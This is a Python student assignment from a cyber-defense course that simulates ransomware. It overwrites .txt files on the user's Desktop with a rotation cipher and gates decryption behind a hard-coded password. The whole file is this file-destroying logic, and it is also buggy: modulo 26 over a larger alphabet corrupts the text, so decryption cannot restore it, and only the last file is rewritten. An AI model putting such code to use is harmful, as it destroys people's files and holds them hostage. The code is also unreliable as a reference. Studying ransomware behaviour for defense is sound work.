'''
FIAP
Defesa Cibernética - 1TDCF - 2021
Development e Coding for Security
Prof. Fábio Henrique Cabrini
Atividade: Checkpoint 1 - 2º Semestre
Alunos:
Gabriel Anselmo Pires Dos Santos - RM87010
Tomás Esteves Andrade - RM89081
'''

import os #Este módulo fornece uma maneira simples de usar funcionalidades que são dependentes de sistema operacional.
import glob #Busca arquivos usando um padrão estabelecido.
import string
from pathlib import Path #Este módulo oferece classes que representam caminhos de sistema de arquivos com semântica apropriada para diferentes sistemas operacionais.

filelist = ['*.txt'] #Esta variável define a extensão dos arquivos que serão buscados.
print('Criptografando')

#Acessa o Desktop e verifica se os arquivos estão no local.
try:
    desktop = Path.home() / "Desktop"
except Exception:
    pass
os.chdir(desktop)

#Nessa etapa, há uma verificação para saber se existem arquivos no Desktop que correspondem à extensão que está sendo buscada (.txt). Quando o arquivos é encontrado, o nome dele é printado e ele é aberto. É pedida a chave de criptogtrafia para que ela possa ser executada. A partir disso, o conteúdo do arquivo é lido e criptografado.
for files in filelist:
    for file_name in glob.glob(files):
        print(file_name)
        file = open(file_name, 'r')
        rotation = int(input("Input the key: "))
        message = str(file.read())
        alfabet = list(string.ascii_letters + string.punctuation)
        result = ''
        for character in message:
            if character.isspace():
                result += character
            else: 
                if character in alfabet:
                    position = alfabet.index(character)
                    position = (position + rotation) % 26
                    result = result + alfabet[position]
                    print (result)
                    file.close()

#O resultado da criptografia é transcrito para o arquivo, substituindo seu conteúdo anterior.                    
encrypt = result

file = open(file_name, 'w')
file.writelines(result)
file.close()

#Após a criptografia ser finalizada, uma senha para liberação e descriptografia do arquivo é pedida. Caso o usuário digite a senha correta, o processo inverso da criptografia ocorre e então o conteúdo criptografado é substituído pelo conteúdo original, que estava presente anteriormente no arquivo. Caso contrário, uma mensagem será exibida dizendo que a senha não está correta e então o usuário não poderá descriptografar seu arquivo.
decrypt = ''
pwd = input('Digite a senha para liberar os arquivos: ')
if pwd == 'a1b2c3':
    for character in encrypt:
        if character.isspace():
            decrypt += character
        else:
            if character in alfabet:
                position = alfabet.index(character)
                position = (position - rotation) % 26
                decrypt = decrypt + alfabet[position]
                print (decrypt)
                file = open(file_name, 'w')
                file.writelines(decrypt)
                file.close()
    print('Seu arquivo foi descriptografado')
else:
    print('A senha digitada não está correta!')